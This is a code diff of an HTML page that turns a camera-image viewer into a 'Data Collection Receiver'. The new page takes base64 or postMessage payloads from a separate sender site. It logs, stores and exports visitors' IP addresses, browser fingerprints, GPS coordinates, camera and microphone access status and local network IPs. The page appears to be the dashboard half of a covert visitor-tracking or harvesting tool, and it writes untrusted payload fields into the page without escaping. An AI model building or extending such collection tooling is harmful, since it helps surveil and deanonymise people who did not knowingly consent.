@@ -1,214 +1,260 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Camera Receiver</title>
+    <title>Data Collection Receiver</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             font-family: Arial, sans-serif;
             padding: 20px;
-            text-align: center;
             background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
             color: white;
             min-height: 100vh;
-            margin: 0;
         }
         .container {
-            background: rgba(255, 255, 255, 0.1);
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(0, 0, 0, 0.7);
             padding: 30px;
             border-radius: 15px;
-            backdrop-filter: blur(10px);
-            max-width: 600px;
-            margin: 0 auto;
         }
-        #receivedImage {
-            max-width: 100%;
-            border: 3px solid white;
-            border-radius: 10px;
-            margin: 20px 0;
-            background: black;
-            min-height: 300px;
-            display: none;
-        }
-        .placeholder {
-            color: #ccc;
-            font-style: italic;
-            padding: 50px;
-            border: 2px dashed rgba(255,255,255,0.3);
-            border-radius: 10px;
-        }
-        .status {
-            padding: 15px;
-            margin: 15px 0;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 8px;
-            font-size: 14px;
-        }
-        .info-box {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin: 20px 0;
-            text-align: left;
-        }
-        .info-item {
+        .data-card {
             background: rgba(255, 255, 255, 0.1);
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 12px;
+            margin: 15px 0;
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #4CAF50;
         }
-        button {
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .stat-card {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        pre {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-size: 12px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .connection-status {
+            position: fixed;
+            top: 20px;
+            right: 20px;
             padding: 10px 20px;
-            margin: 5px;
-            background: #2196F3;
-            color: white;
-            border: none;
+            background: #4CAF50;
             border-radius: 20px;
-            cursor: pointer;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
+    <div class="connection-status" id="connectionStatus">🟢 Connected</div>
+    
     <div class="container">
-        <h1>📡 Camera Receiver</h1>
-        <p>Live images from: <strong>cam-sender-steel.vercel.app</strong></p>
-        
-        <div class="status" id="status">Waiting for connection from sender...</div>
-        
-        <div id="imageContainer">
-            <img id="receivedImage" src="" alt="Received image will appear here">
-            <div id="placeholder" class="placeholder">No image received yet</div>
+        <h1>📊 Data Collection Receiver</h1>
+        <p>Live data received from sender website</p>
+
+        <div class="stats">
+            <div class="stat-card">
+                <h3>Total Received</h3>
+                <div id="totalReceived">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Last Received</h3>
+                <div id="lastReceived">Never</div>
+            </div>
+            <div class="stat-card">
+                <h3>IP Addresses</h3>
+                <div id="uniqueIPs">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Locations</h3>
+                <div id="locationsCount">0</div>
+            </div>
         </div>
-        
-        <div class="info-box">
-            <div class="info-item">Last received: <span id="lastTime">Never</span></div>
-            <div class="info-item">Total received: <span id="totalReceived">0</span></div>
-            <div class="info-item">Image size: <span id="imageSize">0 KB</span></div>
-            <div class="info-item">Frame number: <span id="frameNumber">-</span></div>
+
+        <div class="data-card">
+            <h3>🌐 Live Data Stream</h3>
+            <button onclick="clearData()" style="background: #ff9800;">Clear All Data</button>
+            <button onclick="exportData()" style="background: #2196F3;">Export JSON</button>
+            <div id="liveData">
+                <p>Waiting for data from sender...</p>
+            </div>
         </div>
-        
-        <div>
-            <button onclick="clearImages()">Clear Display</button>
-            <button onclick="openSender()">Open Sender</button>
-            <button onclick="toggleAutoRefresh()" id="refreshBtn">Enable Auto-Refresh</button>
+
+        <div class="data-card">
+            <h3>📋 Received Data Log</h3>
+            <pre id="dataLog">No data received yet.</pre>
         </div>
-        
-        <div style="margin-top: 20px; font-size: 12px; opacity: 0.7;">
-            <p>This page will automatically show images when they are sent from the camera site.</p>
-        </div>
+
+        <div id="receivedData" style="display: none;"></div>
     </div>
 
     <script>
-        // Configuration - USING YOUR ACTUAL SENDER URL
-        const SENDER_URL = "https://cam-sender-steel.vercel.app";
-        
+        let receivedData = [];
+        let uniqueIPs = new Set();
         let totalReceived = 0;
-        let autoRefreshInterval = null;
-        let isAutoRefresh = false;
-        
-        function updateStatus(message, isError = false) {
-            const status = document.getElementById('status');
-            status.textContent = message;
-            status.style.background = isError ? 'rgba(255, 0, 0, 0.3)' : 'rgba(0, 0, 0, 0.3)';
-        }
-        
-        function displayImage(imageData, frameNumber = 'Unknown') {
-            const imgElement = document.getElementById('receivedImage');
-            const placeholder = document.getElementById('placeholder');
-            
-            imgElement.src = imageData;
-            imgElement.style.display = 'block';
-            placeholder.style.display = 'none';
-            
-            // Update info
+
+        // Function to handle incoming data
+        function handleIncomingData(payload) {
             totalReceived++;
-            const currentTime = new Date();
-            document.getElementById('lastTime').textContent = currentTime.toLocaleTimeString();
+            uniqueIPs.add(payload.data.basicInfo.ip);
+            
+            // Update stats
             document.getElementById('totalReceived').textContent = totalReceived;
-            document.getElementById('frameNumber').textContent = frameNumber;
+            document.getElementById('lastReceived').textContent = new Date().toLocaleTimeString();
+            document.getElementById('uniqueIPs').textContent = uniqueIPs.size;
+            document.getElementById('locationsCount').textContent = 
+                receivedData.filter(d => d.data.location.latitude).length;
+
+            // Add to received data array
+            receivedData.push(payload);
             
-            // Calculate image size
-            const sizeKB = Math.round((imageData.length * 0.75) / 1024);
-            document.getElementById('imageSize').textContent = sizeKB + ' KB';
+            // Update live display
+            updateLiveDisplay(payload);
             
-            updateStatus(`✅ Image #${frameNumber} received (${sizeKB} KB)`);
+            // Update data log
+            updateDataLog();
+            
+            // Store in localStorage
+            localStorage.setItem('receivedData', JSON.stringify(receivedData));
         }
-        
-        function clearImages() {
-            const imgElement = document.getElementById('receivedImage');
-            const placeholder = document.getElementById('placeholder');
+
+        function updateLiveDisplay(payload) {
+            const liveData = document.getElementById('liveData');
+            const data = payload.data;
             
-            imgElement.src = '';
-            imgElement.style.display = 'none';
-            placeholder.style.display = 'block';
+            const display = `
+                <div style="border: 2px solid #4CAF50; padding: 15px; margin: 10px 0; border-radius: 10px;">
+                    <h4>📨 New Data Received - ${new Date().toLocaleTimeString()}</h4>
+                    <p><strong>IP:</strong> ${data.basicInfo.ip}</p>
+                    <p><strong>User Agent:</strong> ${data.basicInfo.fingerprint.userAgent.substring(0, 50)}...</p>
+                    ${data.location.latitude ? 
+                        `<p><strong>📍 Location:</strong> ${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}</p>` : 
+                        '<p><strong>📍 Location:</strong> Not provided</p>'
+                    }
+                    <p><strong>📷 Media Access:</strong> ${data.mediaAccess.camera ? '✅ Camera' : '❌ Camera'} | ${data.mediaAccess.microphone ? '✅ Mic' : '❌ Mic'}</p>
+                    <p><strong>🌐 Local IP:</strong> ${data.networkInfo.localIP || 'Unknown'}</p>
+                    <button onclick="viewDetails(${receivedData.length - 1})">View Full Details</button>
+                </div>
+            `;
             
-            updateStatus("Display cleared - waiting for new images");
+            liveData.innerHTML = display + liveData.innerHTML;
         }
-        
-        function openSender() {
-            window.open(SENDER_URL, '_blank');
+
+        function updateDataLog() {
+            const log = document.getElementById('dataLog');
+            log.textContent = JSON.stringify(receivedData, null, 2);
         }
-        
-        function toggleAutoRefresh() {
-            const button = document.getElementById('refreshBtn');
+
+        function viewDetails(index) {
+            const data = receivedData[index];
+            alert(JSON.stringify(data, null, 2));
+        }
+
+        function clearData() {
+            receivedData = [];
+            uniqueIPs = new Set();
+            totalReceived = 0;
+            localStorage.removeItem('receivedData');
             
-            if (isAutoRefresh) {
-                // Stop auto-refresh
-                clearInterval(autoRefreshInterval);
-                isAutoRefresh = false;
-                button.textContent = 'Enable Auto-Refresh';
-                button.style.background = '#2196F3';
-                updateStatus("Auto-refresh disabled");
-            } else {
-                // Start auto-refresh (every 5 seconds)
-                autoRefreshInterval = setInterval(() => {
-                    checkForImageFromURL();
-                }, 5000);
-                isAutoRefresh = true;
-                button.textContent = 'Disable Auto-Refresh';
-                button.style.background = '#f5576c';
-                updateStatus("Auto-refresh enabled - checking every 5 seconds");
-            }
+            document.getElementById('totalReceived').textContent = '0';
+            document.getElementById('lastReceived').textContent = 'Never';
+            document.getElementById('uniqueIPs').textContent = '0';
+            document.getElementById('locationsCount').textContent = '0';
+            document.getElementById('liveData').innerHTML = '<p>Waiting for data from sender...</p>';
+            document.getElementById('dataLog').textContent = 'No data received yet.';
         }
-        
-        function checkForImageFromURL() {
+
+        function exportData() {
+            const dataStr = JSON.stringify(receivedData, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(dataBlob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `collected-data-${new Date().toISOString().split('T')[0]}.json`;
+            link.click();
+            URL.revokeObjectURL(url);
+        }
+
+        // Check for data in URL parameters (Method 3)
+        function checkURLForData() {
             const urlParams = new URLSearchParams(window.location.search);
-            const imageData = urlParams.get('image');
-            const frameNumber = urlParams.get('frame') || 'URL';
+            const payload = urlParams.get('payload');
             
-            if (imageData) {
-                displayImage(imageData, frameNumber);
-                
-                // Clean URL but keep functionality
-                if (history.replaceState) {
-                    const cleanURL = window.location.pathname;
-                    history.replaceState(null, '', cleanURL);
+            if (payload) {
+                try {
+                    const data = JSON.parse(atob(payload));
+                    handleIncomingData(data);
+                    
+                    // Clean URL
+                    window.history.replaceState({}, document.title, window.location.pathname);
+                } catch (error) {
+                    console.log('Error parsing URL data:', error);
                 }
             }
         }
-        
-        // Listen for messages from the sender window
+
+        // Check for data in localStorage (Method 4)
+        function checkLocalStorageForData() {
+            try {
+                const storedData = localStorage.getItem('collectedData');
+                if (storedData) {
+                    const data = JSON.parse(storedData);
+                    handleIncomingData(data);
+                    localStorage.removeItem('collectedData');
+                }
+            } catch (error) {
+                console.log('Error reading localStorage data:', error);
+            }
+        }
+
+        // Simulate API endpoint (Method 1)
+        function simulateAPI() {
+            // In a real implementation, you'd have a server endpoint
+            console.log('API endpoint ready at /api/collect');
+        }
+
+        // Listen for messages from sender (Method 2)
         window.addEventListener('message', function(event) {
-            // Verify the message is from our sender
-            if (event.origin === SENDER_URL) {
-                if (event.data.type === 'newImage') {
-                    displayImage(event.data.image, event.data.frameNumber);
+            // Verify origin for security
+            if (event.origin === 'https://your-sender-site.vercel.app') {
+                if (event.data.type === 'dataCollection') {
+                    handleIncomingData(event.data);
                 }
             }
         });
-        
-        // Check for image on page load (from URL parameters)
+
+        // Check for data on page load
         window.addEventListener('load', function() {
-            checkForImageFromURL();
-            updateStatus("Ready - waiting for images from: " + SENDER_URL);
-        });
-        
-        // Also check when page becomes visible
-        document.addEventListener('visibilitychange', function() {
-            if (!document.hidden) {
-                checkForImageFromURL();
+            checkURLForData();
+            checkLocalStorageForData();
+            simulateAPI();
+            
+            // Load previously stored data
+            const stored = localStorage.getItem('receivedData');
+            if (stored) {
+                receivedData = JSON.parse(stored);
+                receivedData.forEach(data => {
+                    uniqueIPs.add(data.data.basicInfo.ip);
+                    totalReceived++;
+                });
+                updateDataLog();
             }
         });
+
+        // Auto-check for new data every 5 seconds
+        setInterval(checkLocalStorageForData, 5000);
     </script>
 </body>
 </html>
